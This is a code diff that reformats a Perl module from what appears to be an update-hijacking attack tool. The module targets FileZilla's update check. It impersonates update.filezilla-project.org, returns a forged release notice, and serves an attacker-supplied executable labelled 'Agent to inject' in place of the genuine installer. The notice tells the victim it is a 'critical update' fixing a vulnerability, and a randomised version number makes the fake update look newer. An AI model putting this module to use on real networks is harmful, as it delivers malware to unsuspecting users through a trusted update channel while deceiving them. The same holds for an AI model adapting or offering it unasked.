@@ -27,47 +27,53 @@ use Data::Dump qw(dump);
 
 use isrcore::utils;
 
-my $base=
-{
-    'name' => 'FileZilla',
-    'version' => '1.0',
-    'appver'  => '',
-    'author' => [ 'Francisco Amato < famato +[AT]+ infobytesec.com >' ],
-    'description' => qq{},    
-    'vh' => '(update.filezilla-project.org)',
-    'request' => [
-		    {
-		    'req' => '/updatecheck.php?', #regex friendly
-		    'type' => 'string', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 0,
-		    'string' => 'release 3.3.<%VERSION%> http://update.filezilla-project.org/filezilla/FileZilla_3.3.<%VERSION%>_win32-setup.exe\n\n3.3.<%VERSION%> (2009-01-07)\n\n- <%DESCRIPTION%>',
-		    'parse' => 1,
-		    'file' => '',
-		    },
-		    
-		    {
-		    'req' => '.exe', #regex friendly
-		    'type' => 'agent', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 1,		    
-		    'string' => '',
-		    'parse' => 0,
-		    'file' => ''
-		    },
-		    
+my $base = {
+    'name'        => 'FileZilla',
+    'version'     => '1.0',
+    'appver'      => '',
+    'author'      => ['Francisco Amato < famato +[AT]+ infobytesec.com >'],
+    'description' => qq{},
+    'vh'          => '(update.filezilla-project.org)',
+    'request'     => [
+        {   'req'    => '/updatecheck.php?',    #regex friendly
+            'type'   => 'string',               #file|string|agent|install
+            'method' => '',                     #any
+            'bin'    => 0,
+            'string' =>
+                'release 3.3.<%VERSION%> http://update.filezilla-project.org/filezilla/FileZilla_3.3.<%VERSION%>_win32-setup.exe\n\n3.3.<%VERSION%> (2009-01-07)\n\n- <%DESCRIPTION%>',
+            'parse' => 1,
+            'file'  => '',
+        },
+
+        {   'req'    => '.exe',                 #regex friendly
+            'type'   => 'agent',                #file|string|agent|install
+            'method' => '',                     #any
+            'bin'    => 1,
+            'string' => '',
+            'parse'  => 0,
+            'file'   => ''
+        },
 
     ],
-    #Options		    
-    'options' => {  'agent'  => { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject'},
-		    'enable' => { 'val' => 1, 
-			    	  'desc' => 'Status'},
-		'description' => { 'val' => 'This critical update fix internal vulnerability',                                                                                 
-				'desc' => 'Description to be displayed during the update'},
-		'version'  => { 'val' => 'isrcore::utils::RndNum(2)',                                                                                                   
-                        	'hidden' => 1,                                                                                                                                   
-                              'dynamic' =>1,}, 
-		 }
+
+    #Options
+    'options' => {
+        'agent' =>
+            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
+        'enable' => {
+            'val'  => 1,
+            'desc' => 'Status'
+        },
+        'description' => {
+            'val'  => 'This critical update fix internal vulnerability',
+            'desc' => 'Description to be displayed during the update'
+        },
+        'version' => {
+            'val'     => 'isrcore::utils::RndNum(2)',
+            'hidden'  => 1,
+            'dynamic' => 1,
+        },
+    }
 };
 
 ##########################################################################
@@ -80,5 +86,5 @@ sub new {
     my $class = shift;
     my $self = { 'Base' => $base, @_ };
     return bless $self, $class;
-}            
+}
 1;
